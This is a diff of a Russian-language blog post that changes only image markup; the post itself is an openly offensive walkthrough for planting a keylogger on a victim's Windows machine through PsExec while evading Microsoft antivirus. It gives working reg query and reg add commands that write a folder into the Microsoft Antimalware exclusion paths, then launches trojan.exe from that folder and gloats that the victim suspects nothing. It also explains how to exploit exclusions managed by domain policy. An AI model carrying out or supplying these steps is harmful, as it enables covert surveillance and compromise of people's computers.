@@ -9,7 +9,6 @@ date: 2015-02-15
 Разберём неправильный и правильный способ решения данной задачи.  
   
 
-
 ###  **Неправильный способ**
 
 **  
@@ -19,7 +18,7 @@ date: 2015-02-15
   
 1\. Открываем сессию PsExec  
   
-[![](images/1.1.jpg)](images/1.1.jpg)  
+![1.1.jpg]({{ '/images/1.1.jpg' | absolute_url }})  
   
 
 
@@ -30,8 +29,7 @@ date: 2015-02-15
 **  
 
 
-[![](images/8.1.jpg)](images/8.1.jpg)  
-
+![8.1.jpg]({{ '/images/8.1.jpg' | absolute_url }})  
 
   
 
@@ -40,20 +38,15 @@ date: 2015-02-15
 
   
 
-
 **tasklist /fi "IMAGENAME eq VME.exe"**
 
   
 
-
-[![](images/3.jpg)](images/3.jpg)
-
-  
-
+![3.jpg]({{ '/images/3.jpg' | absolute_url }}) 
 
   
 
-
+  
   
   
   
@@ -61,19 +54,16 @@ date: 2015-02-15
 
   
 
+![4.jpg]({{ '/images/4.jpg' | absolute_url }}) 
 
-[![](images/4.jpg)](images/4.jpg)
+  
 
   
 
 
-  
-
-
-[![](images/5.jpg)](images/5.jpg)
+![5.jpg]({{ '/images/5.jpg' | absolute_url }}) 
 
   
-
 
   
   
@@ -81,11 +71,9 @@ date: 2015-02-15
 
   
 
-
 ###  Правильный способ
 
   
-
 
 Теперь пойдём другим путём и установим логгер в директорию, которая не будет проверятся антивирусом.  
   
@@ -95,21 +83,16 @@ date: 2015-02-15
 
   
 
-
 **reg query "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"**
 
   
 
-
-[![](images/6.jpg)](images/6.jpg)
-
-  
-
+![6.jpg]({{ '/images/6.jpg' | absolute_url }}) 
 
   
 
-
   
+
   
   
   
@@ -119,31 +102,25 @@ date: 2015-02-15
 
   
 
-
 2. Добавим в исключения директорию **c:\Windows\SysWOW64\WindowsPowerShell\**
 
   
-
 
 **reg add "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths" /v c:\Windows\SysWOW64\WindowsPowerShell\ /d "1" /t REG_DWORD**
 
   
 
-
 и проверим результат
 
   
-
 
 **reg query "HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths"**
 
   
 
-
   
 
-
-[![](images/7.1.jpg)](images/7.1.jpg)
+![7.1.jpg]({{ '/images/7.1.jpg' | absolute_url }}) 
 
   
   
@@ -151,45 +128,34 @@ date: 2015-02-15
 
   
 
-
-**c:\Windows\SysWOW64\WindowsPowerShell\trojan.exe**
-
-  
-
-
-[![](images/8.1.jpg)](images/8.1.jpg)
+**c:\Windows\SysWOW64\WindowsPowerShell\trojan.exe**  
 
   
 
+![8.1.jpg]({{ '/images/8.1.jpg' | absolute_url }}) 
+
+  
 
 Проверяем результат:
 
   
 
-
 **tasklist /fi "IMAGENAME eq VME.exe"**
 
   
 
-
-[![](images/9.jpg)](images/9.jpg)
+![9.jpg]({{ '/images/9.jpg' | absolute_url }}) 
 
   
-
 
 PROFIT! Логгер запущен, а антивирус жертвы ни о чём не подозревает
 
   
 
-
-[![](images/10.jpg)](images/10.jpg)
-
-  
-
+![10.jpg]({{ '/images/10.jpg' | absolute_url }}) 
 
   
-  
-  
+
   
   
   
@@ -222,13 +188,11 @@ PROFIT! Логгер запущен, а антивирус жертвы ни о 
 
   
 
-
 В случае когда жертва является членом домена AD и вместо **Essentials** у неё установлен **System Center Endpoint Protection** , логика действий будет немного другой. Endpoint Protection, как и  Essentials хранит исключения в HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths, но их список, скорее всего, будет настроен централизованно через политики защиты. В этом случае наши изменения будут перезаписаны после повторного применения политики, поэтому у нас есть два варианта действий:  
 
-
+  
   * Если список исключений задан (в реестре есть какие-либо записи) устанавливаем логгер в любой из перечисленных там каталогов;
   * Если список исключений не задан (записи в реестре отсутствуют) то политика исключений не настроена и мы можем смело вписывать туда нужный нам каталог.
 
 
-
-В остальном порядок действий ничем не отличается. 
+В остальном порядок действий ничем не отличается.
